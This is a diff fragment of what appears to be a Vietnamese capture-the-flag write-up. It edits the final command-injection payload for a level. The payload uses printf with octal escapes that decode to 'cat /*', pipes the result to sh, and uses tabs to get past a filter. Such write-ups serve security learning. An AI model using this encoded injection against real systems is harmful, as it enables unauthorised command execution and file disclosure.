@@ -47,7 +47,7 @@ Nhưng trên payload trên Caido chỉ có 2 dấu `\\` là vì ở backend đã
 → Vậy payload cuối cùng sẽ là:
 
 ```bash
-`printf<TAB>\\143\\141\\164<TAB>\\040\\057\\052<TAB>|<TAB>sh`
+`printf  \\143\\141\\164\\040\\057\\052	|	sh`
 ```
 
 ![](images/level4-finalpayload.png)
